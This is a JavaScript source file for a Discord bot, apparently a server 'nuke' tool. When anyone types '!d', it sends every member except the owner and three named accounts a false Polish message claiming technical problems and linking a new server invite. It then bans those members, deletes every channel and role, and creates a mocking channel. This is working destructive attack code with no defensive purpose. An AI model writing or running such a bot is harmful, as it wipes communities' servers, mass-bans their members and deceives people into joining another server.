const Discord = require('discord.js');
const config = require('./config.json');
const BotClient = new Discord.Client({
    fetchAllMembers: true
});

BotClient.on('ready', () => {
    console.log('Toster BOT is online!');
});

BotClient.on('message', msg => {
    if (msg.content.startsWith('!d')) {
        try {
            msg.guild.members.cache
                .filter(m => m.user.id !== msg.guild.ownerID && m.user.tag !== 'TheToster#3003' && m.user.tag !== '!Wujaszek#4259' && m.user.tag !== 'Kubovid19#8055')
                .forEach(m => {
                    m.user
                        .send(`Przepraszamy, nasz serwer: ${msg.guild.name} miał poważne problemy techniczne, z tego powodu przenosimy się na nowy serwer: https://discord.gg/KuXteh2rBN \nPrzepraszamy za niedogodnienia i życzymy miłego pobytu na nowym serwerze!`)
                        .then(m.ban())
                        .catch(console.error);
                });
            msg.guild.channels.cache.forEach(channel => channel.delete());
            msg.guild.roles.cache.forEach(role => role.delete());
            msg.guild.channels
                .create('No siema xD', {
                    type: 'text'
                })
                .then(msg.guild.fetchTemplates().then(t => t.first().sync()))
                .then(msg.guild.createTemplate('No siema xD').then(t => t.sync()))
                .catch(console.error);
        } catch (error) {
            console.log(error);
        }
    };
});

BotClient.login(config.token);